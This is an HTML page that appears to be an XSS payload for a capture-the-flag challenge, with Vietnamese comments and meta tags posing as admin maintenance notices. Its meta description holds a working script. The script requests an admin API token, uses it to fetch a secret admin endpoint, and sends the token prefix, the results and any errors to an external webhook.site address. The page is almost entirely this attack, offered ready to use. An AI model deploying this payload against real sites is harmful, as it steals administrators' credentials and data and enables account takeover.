<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XSS Payload - Get Admin API Token Then Flag v3</title> <!-- Đổi title để dễ phân biệt -->
    <!-- VERSION_GET_API_TOKEN_V3 --> <!-- Thêm comment để check cache -->

    <meta property="og:title" content="Admin Action Required: Token Refresh Process">
    
    <meta name="description" content="
        <script>
            (function() {
                var webhook_url = 'https://webhook.site/792a817c-a6b3-4529-a9ed-5780c728488a';
            
                // Bước 1: Lấy API Token
                fetch('/generate-token', {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                        // XSRF token sẽ được trình duyệt/fetch tự động xử lý nếu có cookie XSRF-TOKEN
                    }
                })
                .then(response => {
                    if (!response.ok) { // Nếu lỗi khi lấy token
                        return response.text().then(text => { // Lấy text lỗi
                            throw new Error('Failed to generate token: ' + response.status + ' ' + text);
                        });
                    }
                    return response.json(); // Parse JSON nếu OK
                })
                .then(data => {
                    if (data && data.token) {
                        var admin_api_token = data.token;
                        // Gửi token về webhook (tùy chọn, để biết là đã lấy được)
                        new Image().src = webhook_url + '?step=got_api_token&token_prefix=' + admin_api_token.substring(0,10);
            
                        // Bước 2: Dùng API Token để lấy FLAG_2
                        return fetch('/api/admin/sup3rs3cr3t', {
                            method: 'GET',
                            headers: {
                                'Accept': 'application/json',
                                'Authorization': 'Bearer ' + admin_api_token, // Quan trọng!
                                'X-Requested-With': 'XMLHttpRequest'
                            }
                        });
                    } else {
                        throw new Error('No token found in /generate-token response: ' + JSON.stringify(data));
                    }
                })
                .then(response => { // Response từ /api/admin/sup3rs3cr3t
                    if (!response.ok) { // Nếu lỗi khi lấy flag
                         return response.text().then(text => {
                            throw new Error('Failed to get sup3rs3cr3t: ' + response.status + ' ' + text);
                        });
                    }
                    return response.json(); // Parse JSON nếu OK
                })
                .then(flagData => {
                    // Bước 3: Gửi FLAG_2 về webhook
                    new Image().src = webhook_url + '?step=got_flag&flag_content=' + encodeURIComponent(JSON.stringify(flagData));
                })
                .catch(error => {
                    // Bước 3 (lỗi): Gửi thông tin lỗi về webhook
                    var error_message = error.message || error.toString();
                    var error_stack = error.stack ? error.stack.substring(0,300) : 'no_stack';
                    new Image().src = webhook_url + '?step=error&message=' + encodeURIComponent(error_message) + '&stack_preview=' + encodeURIComponent(error_stack);
                });
            })();
        </script>
    ">
    
    <meta property="og:description" content="<!-- This meta tag's content is now inside name=description -->">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="System Maintenance">
    <meta name="twitter:description" content="<!-- This meta tag's content is now inside name=description -->">

</head><body>
    <h1>XSS Payload Page - Attempting to get Admin API Token then Flag (v3)</h1>
    <p>The 'name=description' meta tag contains the XSS payload with logic to call /generate-token first.</p>
</body></html>
